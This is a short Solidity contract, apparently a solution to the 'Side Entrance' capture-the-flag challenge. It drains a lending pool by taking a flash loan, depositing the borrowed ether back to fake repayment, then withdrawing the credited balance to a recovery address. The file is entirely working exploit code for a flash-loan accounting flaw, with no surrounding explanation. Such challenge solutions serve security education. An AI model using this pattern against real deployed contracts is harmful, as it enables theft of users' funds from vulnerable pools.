pragma solidity =0.8.25;
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";


interface ISideEntranceLenderPool{
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
     function withdraw() external;
}

contract SideEntranceAttacker{
    ISideEntranceLenderPool pool; 
    address recovery;
    uint256 constant ETHER_IN_POOL = 1000e18;

    constructor(address _pool, address _recovery){
        pool = ISideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() public {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);

    }

    function execute() external payable{
        pool.deposit{value: ETHER_IN_POOL}();
    }

    receive() external payable {
        
    }



}